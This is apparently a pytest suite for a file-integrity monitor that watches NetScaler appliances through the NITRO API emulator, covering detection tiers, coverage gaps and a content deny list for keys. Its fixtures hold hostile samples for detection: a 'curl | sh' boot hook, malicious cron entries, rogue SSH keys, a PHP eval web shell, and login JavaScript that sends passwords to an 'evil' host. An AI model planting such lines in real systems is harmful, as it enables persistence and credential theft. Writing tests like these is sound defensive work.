"""File-integrity monitoring over NITRO systemfile (collect/fim.py) against the emulator."""

import asyncio
import re
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest

from netrescale import appliance
from netrescale.collect.fim import (
    CONTENT_DENY,
    TIER_A,
    WATCHES,
    FimMonitor,
    Watch,
    content_allowed,
)
from netrescale.config import DeviceFim, FimDefaults, load_config
from netrescale.detect.findings import Finding
from netrescale.detect.severity import Severity
from netrescale.secrets.base import Credential
from netrescale.store.snapshots import FileSnapshotStore
from netrescale.transport.nitro import (
    AuthRejected,
    NitroClient,
    NitroError,
    NitroTarget,
    PermissionDenied,
    ReadOnlyViolation,
)
from tests.emulator.nitro import FakeNitro

TARGET = NitroTarget("ns1", "ns1.example", spki_pin="unused-with-mock-transport")
T0 = datetime(2026, 10, 13, 12, 0, tzinfo=UTC)
PROBE = timedelta(seconds=60)
WALK = timedelta(seconds=FimDefaults().webroot_interval)
REHASH = timedelta(seconds=FimDefaults().rehash_interval)
FILES = {
    "/nsconfig/rc.netscaler": b"#!/bin/sh\n/netscaler/nsstart\n",
    "/nsconfig/ns.conf": b"add system user admin secret -encrypted\n",
    "/nsconfig/ssl/ns-server.key": b"-----BEGIN PRIVATE KEY-----\n",
    "/nsconfig/keys/kek.key": b"KEK",
    "/nsconfig/ssh/authorized_keys": b"ssh-ed25519 AAAA admin\n",
    "/nsconfig/ssh/ssh_host_rsa_key": b"-----BEGIN OPENSSH PRIVATE KEY-----\n",
    "/nsconfig/ssh/ssh_host_rsa_key.pub": b"ssh-rsa AAAA\n",
    "/var/cron/tabs/root": b"0 * * * * /netscaler/nsaaacleanup\n",
    "/etc/httpd.conf": b"LoadModule php_module\n",
    "/etc/crontab": b"*/5 * * * * root /usr/libexec/atrun\n",
    "/var/netscaler/logon/LogonPoint/index.html": b"<html>logon</html>",
    "/var/netscaler/logon/LogonPoint/receiver/js/ctxs.core.min.js": b"var ctxs=1;",
    "/var/netscaler/logon/themes/Default/css/base.css": b"body{}",
    "/var/vpn/themes/theme.js": b"var theme=1;",
    "/netscaler/ns_gui/vpn/index.html": b"<html>vpn</html>",
    "/netscaler/ns_gui/epa/scripts/win/nsepa_setup.exe": b"MZ",
    "/var/tmp/netscaler/portal/templates/custom.xml": b"<xml/>",
    "/var/tmp/ns_upgrade.log": b"upgrade\n",
    "/var/core/1/NSPPE-00-1000.gz": b"core",
}


def client(fake: FakeNitro, user: str = "nr_nitro", pw: str = "nitro-password") -> NitroClient:
    return NitroClient(TARGET, lambda: Credential(user, pw), transport=fake.transport())


def setup(tmp_path: Path, files: dict[str, bytes] | None = None,
          **settings: int) -> tuple[FakeNitro, FimMonitor]:
    fake = FakeNitro(files=dict(FILES if files is None else files))
    monitor = FimMonitor("ns1", FileSnapshotStore(tmp_path / "configs"),
                         FimDefaults(**settings))  # type: ignore[arg-type]
    return fake, monitor


async def tick(monitor: FimMonitor, fake: FakeNitro, at: datetime) -> list[Finding]:
    async with client(fake) as c:
        findings = await monitor.tick(c, at)
    monitor.acknowledge()
    return findings


def rules(findings: list[Finding]) -> dict[str, Finding]:
    return {f.rule_id: f for f in findings}


def content_reads(fake: FakeNitro) -> list[str]:
    reads = []
    for request in fake.requests:
        args = request.url.params.get("args", "")
        if "filename:" in args:
            values = dict(part.split(":", 1) for part in args.split(","))
            reads.append(f"{values['filelocation'].rstrip('/')}/{values['filename']}")
    return reads


def listings(fake: FakeNitro) -> list[str]:
    return [request.url.params["args"].removeprefix("filelocation:")
            for request in fake.requests
            if request.url.path.endswith("systemfile")
            and "filename:" not in request.url.params.get("args", "")]


# ---- transport: listing and walking ---------------------------------------------------------

async def test_list_files_returns_metadata_through_a_read_only_get() -> None:
    fake = FakeNitro(files={"/var/vpn/themes/a.js": b"abc", "/var/vpn/index.html": b"x"},
                     file_times={"/var/vpn/index.html": "Tue Oct 13 09:00:00 2026"})
    async with client(fake) as nitro:
        entries = {entry.name: entry for entry in await nitro.list_files("/var/vpn")}
    assert entries["themes"].is_dir and entries["themes"].path == "/var/vpn/themes"
    assert not entries["index.html"].is_dir and entries["index.html"].size == 1
    assert entries["index.html"].modified == "Tue Oct 13 09:00:00 2026"
    listing = [r for r in fake.requests if r.url.path.endswith("systemfile")]
    assert [r.url.query for r in listing] == [b"args=filelocation:%2Fvar%2Fvpn"]
    assert all(r.method == "GET" or r.url.path.rsplit("/", 1)[-1] in {"login", "logout"}
               for r in fake.requests)


@pytest.mark.parametrize("location", [
    "var/vpn", "/var/vpn/../../nsconfig/ssl", "/var/./vpn", "/var/vpn,filename:x",
    "/var:vpn", "/var/vpn\n", "/" + "a" * 127,
])
async def test_list_files_rejects_unsafe_locations_without_a_request(location: str) -> None:
    fake = FakeNitro()
    async with client(fake) as nitro:
        with pytest.raises(ValueError):
            await nitro.list_files(location)
    assert not fake.requests


async def test_list_files_errors_are_classified() -> None:
    fake = FakeNitro(files={"/var/vpn/a.js": b"x"}, denied_paths={"/nsconfig/ssl"})
    async with client(fake) as nitro:
        with pytest.raises(PermissionDenied):
            await nitro.list_files("/nsconfig/ssl")
        with pytest.raises(NitroError) as missing:
            await nitro.list_files("/var/nstmp")
        assert missing.value.status == 404
        assert await nitro.list_files("/var/vpn") != []


@pytest.mark.parametrize("item", [
    {"filename": "x.js", "filelocation": "/nsconfig/ssl"},
    {"filename": "../x", "filelocation": "/var/vpn"},
    {"filename": "", "filelocation": "/var/vpn"},
])
async def test_list_files_rejects_a_different_or_malformed_listing(item: dict[str, str]) -> None:
    fake = FakeNitro(resources={"systemfile": [item]})
    async with client(fake) as nitro:
        with pytest.raises(NitroError):
            await nitro.list_files("/var/vpn")


async def test_walk_is_bounded_by_depth_entries_and_time() -> None:
    files = {f"/var/vpn/d{i}/sub/deeper/f{i}.js": b"x" for i in range(5)}
    fake = FakeNitro(files=files)
    async with client(fake) as nitro:
        shallow = await nitro.walk_files("/var/vpn", max_depth=1)
        assert {path for path, limit in shallow.unvisited.items() if limit == "depth"} == {
            f"/var/vpn/d{i}/sub" for i in range(5)}
        assert not shallow.complete
        capped = await nitro.walk_files("/var/vpn", max_entries=3)
        assert capped.truncated == "entries" and not capped.complete
        ticks = iter(range(100))
        timed = await nitro.walk_files("/var/vpn", max_seconds=2, clock=lambda: next(ticks))
        assert timed.truncated == "time" and timed.unvisited
        full = await nitro.walk_files("/var/vpn")
        assert full.complete and len([e for e in full.entries if not e.is_dir]) == 5


async def test_walk_records_refused_directories_and_prunes() -> None:
    fake = FakeNitro(files={"/var/tmp/a/x.sh": b"x", "/var/tmp/b/y.sh": b"y",
                            "/var/tmp/netscaler/portal/templates/t.xml": b"t"},
                     denied_paths={"/var/tmp/b"})
    async with client(fake) as nitro:
        walk = await nitro.walk_files("/var/tmp", prune={"/var/tmp/netscaler/portal"})
    assert isinstance(walk.errors["/var/tmp/b"], PermissionDenied)
    assert "/var/tmp/netscaler/portal" not in walk.listed
    assert {e.path for e in walk.entries if not e.is_dir} == {"/var/tmp/a/x.sh"}


async def test_walk_propagates_login_rejection() -> None:
    fake = FakeNitro(files={"/var/vpn/a.js": b"x"})
    async with client(fake, pw="wrong") as nitro:
        with pytest.raises(AuthRejected):
            await nitro.walk_files("/var/vpn")


async def test_listing_goes_through_the_read_only_guard() -> None:
    fake = FakeNitro()
    async with client(fake) as nitro:
        await nitro.login()
        with pytest.raises(ReadOnlyViolation):
            await nitro._http.delete("/nitro/v1/config/systemfile?args=filelocation:%2Fvar%2Fvpn")
        with pytest.raises(ReadOnlyViolation):
            await nitro._http.post("/nitro/v1/config/systemfile", json={})
    assert all(r.method == "GET" or r.url.path.endswith(("login", "logout"))
               for r in fake.requests)


# ---- deny list ------------------------------------------------------------------------------

@pytest.mark.parametrize("path", [
    "/nsconfig/ssl/ns-server.key", "/nsconfig/ssl/ns-root.cert", "/nsconfig/keys/kek",
    "/flash/nsconfig/keys/x", "/flash/nsconfig/ssl/x", "/var/core/1/NSPPE-00.gz",
    "/var/crash/vmcore.0", "/nsconfig/ssh/ssh_host_ed25519_key", "/var/pubkey/u/id_rsa",
    "/var/vpn/server.KEY", "/var/vpn/x.pem", "/var/vpn/../../nsconfig/ssl/x",
    "//nsconfig/ssl/x", "/nsconfig/ssl", "relative/path",
    "/nsconfig/ssh/ssh_host_key", "/nsconfig/ssh/ssh_host_rsa_key.bak",
    "/nsconfig/ssh/ssh_host_rsa_key-old", "/var/pubkey/u/id_ed25519_sk", "/var/pubkey/u/ID_RSA",
    "/nsconfig/ssh/ssh_host_rsa_key.pub", "/nsconfig/ssh/known_hosts", "/nsconfig/ssh/sshd_config",
    "/var/pubkey/u/backup.tar",
])
def test_content_is_never_allowed_for_keys_cores_or_unnormalized_paths(path: str) -> None:
    assert not content_allowed(path)


@pytest.mark.parametrize("path", [
    "/nsconfig/rc.netscaler", "/nsconfig/ssh/authorized_keys", "/nsconfig/ssh/authorized_keys2",
    "/var/pubkey/nsroot/authorized_keys", "/var/pubkey/u/admin.pub", "/var/vpn/themes/theme.js",
    "/etc/httpd.conf", "/nsconfig/sslx/notdenied",
])
def test_content_is_allowed_elsewhere(path: str) -> None:
    assert content_allowed(path)


def test_deny_list_covers_the_required_trees() -> None:
    assert {"/nsconfig/ssl", "/nsconfig/keys", "/flash/nsconfig/keys"} <= set(CONTENT_DENY)


async def test_keys_ns_conf_and_cores_are_never_read(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    await tick(monitor, fake, T0)
    fake.files["/var/core/2/NSPPE-00-2000.gz"] = b"core"
    fake.files["/nsconfig/ssh/ssh_host_rsa_key"] = b"rotated"
    await tick(monitor, fake, T0 + WALK + REHASH)
    reads = content_reads(fake)
    assert "/nsconfig/rc.netscaler" in reads and "/etc/httpd.conf" in reads
    assert not [p for p in reads if not content_allowed(p)]
    assert not [p for p in reads if p.startswith(("/nsconfig/ssl", "/nsconfig/keys", "/var/core"))
                or p in {"/nsconfig/ns.conf", "/nsconfig/ssh/ssh_host_rsa_key"}]
    assert not [p for p in listings(fake) if p.startswith(("/nsconfig/ssl", "/nsconfig/keys"))]


async def test_a_watch_on_a_denied_tree_still_never_reads_content(tmp_path: Path) -> None:
    fake = FakeNitro(files=dict(FILES))
    monitor = FimMonitor("ns1", FileSnapshotStore(tmp_path), watches=(
        Watch("/nsconfig/ssl", "A", "ssh"), Watch("/nsconfig/keys", "A", "ssh")))
    await tick(monitor, fake, T0)
    fake.files["/nsconfig/ssl/ns-server.key"] = b"-----BEGIN PRIVATE KEY----- swapped"
    findings = await tick(monitor, fake, T0 + REHASH)
    assert content_reads(fake) == []
    change = rules(findings)["fim-ssh-keys-changed"]
    assert change.evidence["files"][0]["verified"] is False  # compared on metadata only


# ---- Tier A ---------------------------------------------------------------------------------

async def test_first_pass_records_a_baseline_to_review_not_an_all_clear(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    findings = await tick(monitor, fake, T0)
    assert [f.rule_id for f in findings] == ["fim-baseline-recorded"]
    baseline = findings[0]
    assert baseline.severity is Severity.MEDIUM
    inventory = baseline.evidence["inventory"]
    assert inventory["boot_hook"]["files"][0]["path"] == "/nsconfig/rc.netscaler"
    assert inventory["boot_hook"]["files"][0]["sha256"]
    assert {i["path"] for i in inventory["webroot"]["files"]} == {
        "/var/netscaler/logon/LogonPoint/receiver/js/ctxs.core.min.js", "/var/vpn/themes/theme.js"}
    assert baseline.evidence["files_per_directory"]["/var/nstmp"] == 0  # absent: empty
    assert await tick(monitor, fake, T0 + PROBE) == []


@pytest.mark.parametrize("path,content,rule,severity", [
    ("/nsconfig/nsafter.sh", b"curl http://x | sh\n", "fim-boot-hook-changed", Severity.CRITICAL),
    ("/nsconfig/rc.netscaler", b"#!/bin/sh\npython /var/tmp/x\n", "fim-boot-hook-changed",
     Severity.CRITICAL),
    ("/var/cron/tabs/nobody", b"* * * * * /var/tmp/sh\n", "fim-crontab-changed",
     Severity.CRITICAL),
    ("/etc/crontab", b"* * * * * root /var/tmp/sh\n", "fim-crontab-changed", Severity.CRITICAL),
    ("/var/pubkey/nsroot/authorized_keys", b"ssh-rsa EVIL\n", "fim-ssh-keys-changed",
     Severity.CRITICAL),
    ("/nsconfig/ssh/authorized_keys", b"ssh-ed25519 AAAA admin\nssh-rsa EVIL\n",
     "fim-ssh-keys-changed", Severity.CRITICAL),
    ("/etc/httpd.conf", b"LoadModule php_module\nAddType application/x-httpd-php .png\n",
     "fim-httpd-conf-changed", Severity.HIGH),
])
async def test_tier_a_changes_are_caught_on_the_next_probe(
        tmp_path: Path, path: str, content: bytes, rule: str, severity: Severity) -> None:
    fake, monitor = setup(tmp_path)
    await tick(monitor, fake, T0)
    fake.files[path] = content
    fake.file_times[path] = "Tue Oct 13 12:00:30 2026"
    found = rules(await tick(monitor, fake, T0 + PROBE))
    assert set(found) == {rule}
    assert found[rule].severity is severity and found[rule].category == "sweep"
    assert found[rule].evidence["files"][0]["path"] == path
    assert await tick(monitor, fake, T0 + 2 * PROBE) == []


async def test_a_timestomped_boot_hook_edit_is_caught_by_the_rehash(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    await tick(monitor, fake, T0)
    # Same size, same mtime: the listing cannot tell, only content can.
    fake.files["/nsconfig/rc.netscaler"] = b"#!/bin/sh\n/var/tmp/xxxxxxxxx\n"
    assert len(fake.files["/nsconfig/rc.netscaler"]) == len(FILES["/nsconfig/rc.netscaler"])
    assert await tick(monitor, fake, T0 + PROBE) == []
    found = rules(await tick(monitor, fake, T0 + REHASH))
    change = found["fim-boot-hook-changed"]
    assert change.severity is Severity.CRITICAL
    assert change.evidence["files"][0]["verified"] is True
    assert change.evidence["files"][0]["before"]["sha256"] != (
        change.evidence["files"][0]["after"]["sha256"])


async def test_touched_files_with_unchanged_content_raise_nothing(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    await tick(monitor, fake, T0)
    for path in ("/etc/httpd.conf", "/etc/crontab", "/nsconfig/rc.netscaler"):
        fake.file_times[path] = "Tue Oct 13 12:00:30 2026"  # e.g. /etc rebuilt at reboot
    assert await tick(monitor, fake, T0 + PROBE) == []


async def test_removed_boot_hook_is_reported(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    await tick(monitor, fake, T0)
    del fake.files["/nsconfig/rc.netscaler"]
    change = rules(await tick(monitor, fake, T0 + PROBE))["fim-boot-hook-changed"]
    assert change.evidence["files"][0]["change"] == "removed"


# ---- Tier B ---------------------------------------------------------------------------------

async def test_new_webshell_is_critical_at_the_next_web_root_walk(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    await tick(monitor, fake, T0)
    fake.files["/var/netscaler/logon/LogonPoint/uiareas/x.php"] = b"<?php eval($_POST[1]);"
    fake.files["/var/vpn/themes/logo.png"] = b"PNG"
    assert await tick(monitor, fake, T0 + PROBE) == []  # Tier B is not due yet
    found = rules(await tick(monitor, fake, T0 + WALK))
    shell = found["fim-webroot-new-script"]
    assert shell.severity is Severity.CRITICAL
    assert shell.evidence["files"][0]["after"]["sha256"]
    assert found["fim-webroot-new-file"].severity is Severity.MEDIUM


@pytest.mark.parametrize("suffix", [".php", ".xhtml", ".pl", ".py", ".sh", ".js"])
async def test_every_script_suffix_is_critical_in_web_roots(tmp_path: Path, suffix: str) -> None:
    fake, monitor = setup(tmp_path)
    await tick(monitor, fake, T0)
    fake.files[f"/netscaler/ns_gui/epa/scripts/a{suffix}"] = b"x"
    found = rules(await tick(monitor, fake, T0 + WALK))
    assert found["fim-webroot-new-script"].severity is Severity.CRITICAL


async def test_modified_logon_script_is_critical_and_removals_low(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    await tick(monitor, fake, T0)
    js = "/var/netscaler/logon/LogonPoint/receiver/js/ctxs.core.min.js"
    fake.files[js] = b"var ctxs=1;fetch('https://evil/'+document.forms[0].passwd.value)"
    del fake.files["/var/netscaler/logon/themes/Default/css/base.css"]
    found = rules(await tick(monitor, fake, T0 + WALK))
    assert found["fim-webroot-script-modified"].severity is Severity.CRITICAL
    assert found["fim-webroot-script-modified"].evidence["files"][0]["verified"] is True
    assert found["fim-webroot-file-removed"].severity is Severity.LOW


async def test_a_deleted_directory_takes_its_files_with_it(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    fake.files["/var/vpn/themes/evil/a.php"] = b"x"
    await tick(monitor, fake, T0)
    del fake.files["/var/vpn/themes/evil/a.php"]
    removed = rules(await tick(monitor, fake, T0 + WALK))["fim-webroot-file-removed"]
    assert removed.evidence["files"][0]["path"] == "/var/vpn/themes/evil/a.php"
    assert "/var/vpn/themes/evil/a.php" not in monitor._load()["files"]


async def test_timestomped_web_root_script_is_caught_by_the_rolling_rehash(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    await tick(monitor, fake, T0)
    fake.files["/var/vpn/themes/theme.js"] = b"var theme=2;"  # same size, same mtime
    assert await tick(monitor, fake, T0 + WALK) == []  # not yet due for a re-hash
    found = rules(await tick(monitor, fake, T0 + WALK + REHASH))
    assert found["fim-webroot-script-modified"].evidence["files"][0]["verified"] is True


async def test_hash_budget_defers_mtime_only_moves_instead_of_alerting(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path, max_hashes=1)
    baseline = rules(await tick(monitor, fake, T0))
    assert ["/var/netscaler/logon", "content not hashed yet (hash budget)"] in (
        baseline["fim-coverage-unknown"].evidence["gaps"])  # the catch-up is not silent
    for path in [p for p in FILES if p.startswith(("/var/netscaler", "/var/vpn"))]:
        fake.file_times[path] = "Tue Oct 13 12:05:00 2026"  # a reboot re-extracting the image
    seen = []
    for n in range(1, 12):  # one hash per pass: the catch-up takes a while, never alerting
        seen += [f.rule_id for f in await tick(monitor, fake, T0 + n * WALK)]
    assert set(seen) <= {"fim-coverage-unknown", "fim-coverage-restored"}
    assert seen[-1] == "fim-coverage-restored"
    state = monitor._load()["files"]
    assert all(state[p]["mtime"] == "Tue Oct 13 12:05:00 2026" and state[p]["sha256"]
               for p in FILES if p.startswith(("/var/netscaler", "/var/vpn")))


async def test_over_budget_size_change_is_reported_unverified(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    for n in range(1, 6):
        await tick(monitor, fake, T0 + (n - 1) * WALK)  # baseline, then hash every file
    monitor.settings = FimDefaults(max_hashes=1)
    fake.files["/var/vpn/themes/theme.js"] = b"var theme=1;document.write(evil)"
    js = "/var/netscaler/logon/LogonPoint/receiver/js/ctxs.core.min.js"
    fake.files[js] = b"var ctxs=1;fetch('https://evil/')"
    change = rules(await tick(monitor, fake, T0 + 5 * WALK))["fim-webroot-script-modified"]
    assert change.severity is Severity.CRITICAL  # the one the budget reached is verified
    assert sorted(f["verified"] for f in change.evidence["files"]) == [False, True]


async def test_mtime_only_move_waiting_too_long_for_the_budget_is_reported(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    await tick(monitor, fake, T0)
    monitor.settings = FimDefaults(max_hashes=1)
    # Two same-size moves; the budget only ever reaches the scripts first, so the CSS waits.
    files = ["/var/netscaler/logon/themes/Default/css/base.css", "/var/vpn/themes/theme.js"]
    for path in files:
        fake.file_times[path] = "Tue Oct 13 12:05:00 2026"
    fake.files["/var/netscaler/logon/themes/Default/css/base.css"] = b"html{}"  # same size
    found: list[Finding] = []
    for n in range(1, 9):
        fake.file_times["/var/vpn/themes/theme.js"] = f"Tue Oct 13 13:0{n}:00 2026"
        found += await tick(monitor, fake, T0 + n * WALK)
    assert any(["/var/netscaler/logon", "changed content not verified yet (hash budget)"]
               in f.evidence["gaps"] for f in found if f.rule_id == "fim-coverage-unknown")
    modified = rules(found)["fim-webroot-file-modified"]
    assert modified.evidence["files"][0]["path"] == files[0]
    assert modified.evidence["files"][0]["verified"] is False


async def test_new_core_dump_is_high_and_never_read(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    await tick(monitor, fake, T0)
    fake.files["/var/core/2/NSPPE-00-2000.gz"] = b"core"
    fake.files["/var/crash/vmcore.1"] = b"crash"
    crash = rules(await tick(monitor, fake, T0 + WALK))["fim-crash-artifact"]
    assert crash.severity is Severity.HIGH and crash.evidence["count"] == 2
    assert not [p for p in content_reads(fake) if p.startswith(("/var/core", "/var/crash"))]


async def test_staging_directories_alert_on_scripts_and_known_artifacts(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    await tick(monitor, fake, T0)
    fake.files["/tmp/sess_123"] = b"session"
    fake.files["/var/tmp/x.py"] = b"import socket"
    fake.files["/var/nstmp/dropper.sh"] = b"#!/bin/sh"
    fake.files["/var/tmp/conf/npc.conf"] = b"[common]"
    found = rules(await tick(monitor, fake, T0 + WALK))
    assert found["fim-staging-new-script"].severity is Severity.HIGH
    assert found["fim-staging-new-script"].evidence["count"] == 2
    assert found["fim-known-ioc-path"].severity is Severity.CRITICAL
    assert "/tmp/sess_123" not in content_reads(fake)
    del fake.files["/var/tmp/x.py"]
    assert await tick(monitor, fake, T0 + 2 * WALK) == []  # staging churn is not reported


async def test_known_artifact_already_present_at_baseline_is_critical(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path, files={**FILES, "/var/tmp/the": b"\x7fELF"})
    found = rules(await tick(monitor, fake, T0))
    assert found["fim-known-ioc-path"].severity is Severity.CRITICAL
    assert "fim-baseline-recorded" in found


# ---- coverage -------------------------------------------------------------------------------

async def test_refused_paths_raise_coverage_unknown_once_then_restored(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    fake.denied_paths = {"/var/vpn", "/var/cron/tabs"}
    found = rules(await tick(monitor, fake, T0))
    gap = found["fim-coverage-unknown"]
    assert gap.category == "health" and gap.severity is Severity.HIGH  # a Tier A path
    assert ["/var/cron/tabs", "refused by the command policy"] in gap.evidence["gaps"]
    assert ["/var/vpn", "refused by the command policy"] in gap.evidence["gaps"]
    assert monitor.status["directories"]["/var/vpn"] == "refused"
    assert await tick(monitor, fake, T0 + PROBE) == []  # not repeated every probe
    fake.denied_paths = set()
    found = rules(await tick(monitor, fake, T0 + WALK))
    assert found["fim-coverage-restored"].severity is Severity.INFO
    assert "fim-baseline-recorded" in found  # first baseline of the newly visible paths
    assert monitor.status["coverage_gaps"] == []


async def test_web_root_only_gap_is_medium(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    fake.denied_paths = {"/var/vpn/themes"}
    gap = rules(await tick(monitor, fake, T0))["fim-coverage-unknown"]
    assert gap.severity is Severity.MEDIUM
    assert gap.evidence["gaps"] == [["/var/vpn/themes", "refused by the command policy"]]


async def test_listing_only_account_reports_metadata_changes_and_a_gap(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    fake.denied_reads = {"/"}
    found = rules(await tick(monitor, fake, T0))
    gaps = found["fim-coverage-unknown"].evidence["gaps"]
    assert ["/nsconfig", "content refused by the command policy"] in gaps
    fake.files["/nsconfig/rc.netscaler"] = b"#!/bin/sh\n/var/tmp/x &\n"
    fake.file_times["/nsconfig/rc.netscaler"] = "Tue Oct 13 12:00:30 2026"
    change = rules(await tick(monitor, fake, T0 + PROBE))["fim-boot-hook-changed"]
    assert change.severity is Severity.CRITICAL
    assert change.evidence["files"][0]["verified"] is False
    assert "listing metadata only" in change.summary


async def test_truncated_walk_is_a_gap_and_proves_nothing_removed(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    await tick(monitor, fake, T0)
    monitor.settings = FimDefaults(max_entries=100)
    fake.files.update({f"/var/tmp/spool/{i:04}.tmp": b"x" for i in range(150)})
    found = rules(await tick(monitor, fake, T0 + WALK))
    assert any("entries limit" in reason
               for _path, reason in found["fim-coverage-unknown"].evidence["gaps"])
    assert "/var/tmp/ns_upgrade.log" in monitor._load()["files"]
    assert "fim-webroot-file-removed" not in found


async def test_walk_time_budget_is_a_gap(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path, walk_seconds=10)
    ticks = iter(range(0, 10000, 3))
    monitor.clock = lambda: float(next(ticks))
    gap = rules(await tick(monitor, fake, T0))["fim-coverage-unknown"]
    assert any("time limit" in reason for _path, reason in gap.evidence["gaps"])


async def test_absent_directory_appearing_later_is_watched(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    found = rules(await tick(monitor, fake, T0))
    assert "fim-coverage-unknown" not in found  # /var/pubkey, /var/nstmp absent: not a gap
    fake.files["/var/pubkey/backup/authorized_keys"] = b"ssh-rsa EVIL"
    change = rules(await tick(monitor, fake, T0 + PROBE))["fim-ssh-keys-changed"]
    assert change.severity is Severity.CRITICAL


async def test_version_refused_is_a_gap(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    fake.denied = {"nsversion"}
    gap = rules(await tick(monitor, fake, T0))["fim-coverage-unknown"]
    assert gap.severity is Severity.HIGH
    assert any(path == "show ns version" for path, _reason in gap.evidence["gaps"])


# ---- firmware upgrades and durability -------------------------------------------------------

async def test_firmware_upgrade_rebaselines_image_paths_but_not_boot_hooks(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    await tick(monitor, fake, T0)
    fake.version = "NetScaler NS14.1: Build 74.10.nc, Date: Nov  1 2026, 10:00:00   (64-bit)"
    fake.files["/etc/httpd.conf"] = b"LoadModule php_module\n# new build\n"
    fake.files["/netscaler/ns_gui/vpn/new_feature.js"] = b"x"
    fake.files["/nsconfig/nsafter.sh"] = b"persist"
    found = rules(await tick(monitor, fake, T0 + PROBE))
    assert found["fim-boot-hook-changed"].severity is Severity.CRITICAL
    assert "fim-httpd-conf-changed" not in found
    upgrade = found["fim-rebaselined-after-upgrade"]
    assert upgrade.severity is Severity.HIGH
    assert upgrade.evidence["to"].startswith("NetScaler NS14.1: Build 74.10")
    assert [i["path"] for i in upgrade.evidence["review"]["files"]] == ["/etc/httpd.conf"]
    assert monitor.status["rebaseline_pending"] is True  # web roots not walked since
    later = rules(await tick(monitor, fake, T0 + WALK))
    assert "fim-webroot-new-script" not in later
    assert [i["path"] for i in later["fim-rebaselined-after-upgrade"].evidence["review"]
            ["files"]] == ["/netscaler/ns_gui/vpn/new_feature.js"]
    assert monitor.status["rebaseline_pending"] is False
    fake.files["/netscaler/ns_gui/vpn/shell.php"] = b"x"
    assert "fim-webroot-new-script" in rules(await tick(monitor, fake, T0 + 2 * WALK))


async def test_findings_stay_pending_until_acknowledged(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    await tick(monitor, fake, T0)
    fake.files["/nsconfig/nsafter.sh"] = b"x"
    async with client(fake) as c:
        first = await monitor.tick(c, T0 + PROBE)
    restarted = FimMonitor("ns1", monitor.store)  # e.g. the database was down, then a restart
    async with client(fake) as c:
        again = await restarted.tick(c, T0 + 2 * PROBE)
    assert [f.dedup_key for f in again] == [f.dedup_key for f in first]
    restarted.acknowledge()
    async with client(fake) as c:
        assert await restarted.tick(c, T0 + 3 * PROBE) == []


async def test_tier_a_listing_is_cheap_between_rehashes(tmp_path: Path) -> None:
    fake, monitor = setup(tmp_path)
    await tick(monitor, fake, T0)
    fake.requests.clear()
    await tick(monitor, fake, T0 + PROBE)
    assert content_reads(fake) == []
    assert set(listings(fake)) == {"/nsconfig", "/nsconfig/ssh", "/var/pubkey",
                                   "/var/cron/tabs", "/etc"}


# ---- appliance policy -----------------------------------------------------------------------

def _listing(location: str) -> str:
    return f"show system file -fileLocation {location}"


def _read(name: str, location: str) -> str:
    return f"show system file {name} -fileLocation {location}"


@pytest.mark.parametrize("command", [
    *[_listing(watch.root) for watch in WATCHES],
    _listing("/var/vpn/themes/x"), _listing("/var/pubkey/nsroot"), _listing('"/var/vpn"'),
    _listing("/var/core/12"),
])
def test_fim_list_policy_allows_the_watched_directories(command: str) -> None:
    assert re.search(appliance.FIM_LIST_REGEX, command)


@pytest.mark.parametrize("command", [
    _listing("/nsconfig/ssl"), _listing("/nsconfig/keys"), _listing("/flash/nsconfig/keys"),
    _listing("/var/log"), _listing("/"), _listing("/var/vpn/../../nsconfig/ssl"),
    _listing("/var/vpn/.."), _listing("/nsconfig/ssh/sub"), _listing("/var/pubkey/a/b"),
    _read("ns.conf", "/nsconfig"), "show system user", "show ns runningConfig",
    _listing("/var/vpn /nsconfig/ssl"),
])
def test_fim_list_policy_refuses_everything_else(command: str) -> None:
    assert not re.search(appliance.FIM_LIST_REGEX, command)


@pytest.mark.parametrize("command", [
    _read("rc.netscaler", "/nsconfig"), _read("nsafter.sh", "/nsconfig"),
    _read("authorized_keys", "/nsconfig/ssh"), _read("admin.pub", "/var/pubkey/nsroot"),
    _read("authorized_keys", "/var/pubkey/nsroot"), _read("root", "/var/cron/tabs"),
    _read("httpd.conf", "/etc"), _read("crontab", "/etc"),
    _read("index.html", "/var/netscaler/logon/LogonPoint"), _read("x.php", "/var/tmp"),
    _read('"theme.js"', '"/var/vpn/themes"'),
])
def test_fim_read_policy_allows_the_hashed_files(command: str) -> None:
    assert re.search(appliance.FIM_READ_REGEX, command)


@pytest.mark.parametrize("command", [
    _read("ns.conf", "/nsconfig"), _read("ns-server.key", "/nsconfig/ssl"),
    _read("kek", "/nsconfig/keys"), _read("x", "/flash/nsconfig/keys"),
    _read("ssh_host_rsa_key", "/nsconfig/ssh"), _read("ssh_host_ed25519_key", "/nsconfig/ssh"),
    _read("id_rsa", "/var/pubkey/u"), _read("server.KEY", "/var/vpn"),
    _read("NSPPE-00.gz", "/var/core/1"), _read("vmcore.0", "/var/crash"),
    _read("ns.log", "/var/log"), _read("passwd", "/etc"), _read("x", "/var/vpn/../../etc"),
    _read("..", "/var/vpn"), _read("x", "/nsconfig/ssh/sub"), _listing("/var/vpn"),
    _read("ssh_host_key", "/nsconfig/ssh"), _read("ssh_host_rsa_key.bak", "/nsconfig/ssh"),
    _read("ssh_host_rsa_key.pub", "/nsconfig/ssh"), _read("known_hosts", "/nsconfig/ssh"),
